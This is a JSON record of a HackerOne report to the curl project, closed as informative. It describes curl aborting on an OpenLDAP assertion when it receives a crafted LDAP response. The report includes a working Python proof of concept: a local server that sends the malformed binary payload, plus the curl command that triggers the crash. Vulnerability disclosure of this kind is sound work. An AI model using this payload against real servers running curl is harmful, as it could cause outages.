{
  "id": 3258022,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjU4MDIy",
  "url": "https://hackerone.com/reports/3258022",
  "title": "curl ASSERTs when accessing an LDAP URL",
  "state": "Closed",
  "substate": "informative",
  "readable_substate": "Informative",
  "created_at": "2025-07-17T18:40:42.020Z",
  "submitted_at": "2025-07-17T18:40:42.193Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "cmeister2",
    "url": "/cmeister2",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/097/470/a76b7dac426602ff3bf8c411ac3ad2f8fe3fbb91_original.png/36bca6668139d77be42208d896968344ae7a76c55ee0f8b0f28281ccd492ff02"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35663,
    "url": "https://hackerone.com/curl",
    "handle": "curl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/36bca6668139d77be42208d896968344ae7a76c55ee0f8b0f28281ccd492ff02",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/19c85a12ac35f466af1ea2b0ae853bfe5e8f057fb1d6fb62db131707bb67b30d"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "curl",
      "twitter_handle": "",
      "website": "https://curl.se",
      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": true,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2025-07-22T08:02:49.962Z",
  "bug_reporter_agreed_on_going_public_at": "2025-07-22T08:02:49.720Z",
  "team_member_agreed_on_going_public_at": "2025-07-22T07:52:36.804Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\n\ncurl can crash when accessing an LDAP URL.\n\n```\ncurl ldap://localhost:1388\ncurl: result.c:930: try_read1msg: Assertion `!BER_BVISEMPTY( &resoid )' failed.\nAborted (core dumped)\n```\n\nNo AI was used in the production of this report. This was enabled by oss-fuzz, but initiated by me adding LDAP support to curl-fuzzer.\n\n## Affected version\nThis works for my system curl as well as master curl.\n\n## Steps To Reproduce:\nRun this Python script:\n```\n#!/usr/bin/env python3\n\"\"\"\nSimple socket server that sends a specific binary response on port 1388.\n\"\"\"\n\nimport socket\nimport logging\nimport sys\n\n# Set up logging\nlogging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')\nlog = logging.getLogger(__name__)\n\n# The binary response to send\nBINARY_RESPONSE = b'0%1\\x01\\x00x\\x00\\r\\x00\\x00\\x00\\x00\\x00\\x8a\\x00\\r\\x00\\x06\\x00\\r\\x00\\x00\\x00\\r\\x00\\x00\\x00\\x00\\xc7\\xc7\\xc7\\x9b\\x80\\xeb\\x05123456\\x00\\x03\\x00\\x00\\x00\\tcn=d\\x00\\x10man'\n\nPORT = 1388\n\n\ndef handle_client(client_socket, client_address):\n    \"\"\"Handle a single client connection.\"\"\"\n    try:\n        log.info(f\"Client connected from {client_address}\")\n\n        # Send the binary response\n        client_socket.send(BINARY_RESPONSE)\n        log.info(f\"Sent {len(BINARY_RESPONSE)} bytes to {client_address}\")\n\n    except Exception as e:\n        log.error(f\"Error handling client {client_address}: {e}\")\n    finally:\n        # Close the client socket\n        client_socket.close()\n        log.info(f\"Connection closed for {client_address}\")\n\n\ndef run_server():\n    \"\"\"Run the socket server.\"\"\"\n    # Create a socket\n    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    # Allow socket reuse\n    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n\n    try:\n        # Bind to the port\n        server_socket.bind(('localhost', PORT))\n        server_socket.listen(5)\n\n        log.info(f\"Server listening on port {PORT}\")\n        log.info(\"Press Ctrl+C to stop the server\")\n\n        while True:\n            try:\n                # Accept a client connection\n                client_socket, client_address = server_socket.accept()\n\n                # Handle the client in the same thread (simple approach)\n                handle_client(client_socket, client_address)\n\n            except KeyboardInterrupt:\n                log.info(\"Server shutdown requested\")\n                break\n            except Exception as e:\n                log.error(f\"Error accepting connection: {e}\")\n\n    except Exception as e:\n        log.error(f\"Error starting server: {e}\")\n        sys.exit(1)\n    finally:\n        server_socket.close()\n        log.info(\"Server socket closed\")\n\n\nif __name__ == \"__main__\":\n    run_server()\n```\n\nThis runs a server on port 1388 which simply returns a binary response.\n\nThen call curl:\n\n```\ncurl ldap://localhost:1388\ncurl: result.c:930: try_read1msg: Assertion `!BER_BVISEMPTY( &resoid )' failed.\nAborted (core dumped)\n```\n\ncurl asserts in OpenLDAP.\n\n## Impact\n\n## Summary:\nIf curl is being used on a server and an attacker can influence which URL is being passed to curl, and that URL can use the LDAP protocol, the server will crash, potentially causing outages.",
  "weakness": {
    "id": 65,
    "name": "Business Logic Errors"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 0,
  "voters": [],
  "structured_scope": {
    "databaseId": 18844,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/curl/curl",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
